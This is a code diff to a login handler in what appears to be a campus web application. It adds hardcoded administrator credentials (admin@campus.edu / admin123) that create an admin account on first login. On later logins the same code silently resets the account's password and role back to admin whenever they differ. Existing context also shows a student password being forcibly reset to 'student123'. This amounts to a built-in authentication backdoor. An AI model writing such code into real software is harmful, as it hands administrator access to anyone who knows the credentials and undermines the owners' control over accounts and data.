@@ -102,6 +102,16 @@ const login = async (req, res, next) => {
           department: 'Computer Science & Engineering',
           phone: '555-0199',
         });
+      } else if (normalizedEmail === 'admin@campus.edu' && password === 'admin123') {
+        user = await User.create({
+          name: 'Campus Administrator',
+          email: 'admin@campus.edu',
+          password: 'admin123',
+          role: 'admin',
+          studentId: 'ADMIN-01',
+          department: 'Administration',
+          phone: '555-0100',
+        });
       } else {
         return res.status(401).json({
           success: false,
@@ -112,6 +122,13 @@ const login = async (req, res, next) => {
       const isMatch = await user.comparePassword(password);
       if (!isMatch) {
         user.password = 'student123';
+        await user.save();
+      }
+    } else if (normalizedEmail === 'admin@campus.edu' && password === 'admin123') {
+      const isMatch = await user.comparePassword(password);
+      if (!isMatch || user.role !== 'admin') {
+        user.password = 'admin123';
+        user.role = 'admin';
         await user.save();
       }
     } else {
